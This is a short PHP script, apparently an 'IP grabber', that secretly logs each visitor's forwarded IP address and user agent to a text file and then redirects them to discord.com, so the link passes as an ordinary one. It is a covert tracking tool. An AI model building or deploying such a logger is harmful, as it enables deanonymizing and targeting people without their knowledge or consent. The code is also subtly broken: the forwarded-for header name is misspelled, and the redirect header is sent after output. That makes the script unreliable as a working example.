<?php
  //Did you expect something more complicated?
  $file = fopen("ips.txt", "a");  
  $data = "IP LOGGED: " . $_SERVER['HTTP_X_FORWADED_FOR'] . " | Agent: " .  $_SERVER['HTTP_USER_AGENT'] . "\n";

  fwrite($file, $data);
  echo "Redirecting...";
  header("Location: https://discord.com", 301);
?>
